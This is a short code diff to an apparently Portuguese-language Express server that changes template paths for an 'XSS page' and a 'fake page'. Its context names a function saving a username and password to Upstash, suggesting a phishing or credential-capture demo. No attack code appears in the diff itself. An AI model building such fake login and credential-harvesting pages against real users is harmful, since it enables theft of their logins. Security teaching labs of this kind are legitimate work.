@@ -59,7 +59,7 @@ const saveCredentialsToUpstash = async (usuario: string, senha: string): Promise
 // Route for the XSS page (initial page)
 app.get('/', (req: Request, res: Response): void => {
     try {
-        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'xss_page.html'), 'utf8');
+        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../public/xss_page.html'), 'utf8');
         let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
         htmlWithData = htmlWithData.replace('{{error_message}}', '');
 
@@ -73,7 +73,7 @@ app.get('/', (req: Request, res: Response): void => {
 // Route for the fake page (redirected from XSS page)
 app.get('/fake_page.html', (req: Request, res: Response): void => {
     try {
-        const htmlTemplate = fs.readFileSync(path.join(__dirname, 'fake_page.html'), 'utf8');
+        const htmlTemplate = fs.readFileSync(path.join(__dirname, '../public/fake_page.html'), 'utf8');
         let htmlWithData = htmlTemplate.replace('{{tentativas}}', tentativas.toString());
 
         // Show error message if there's an error parameter
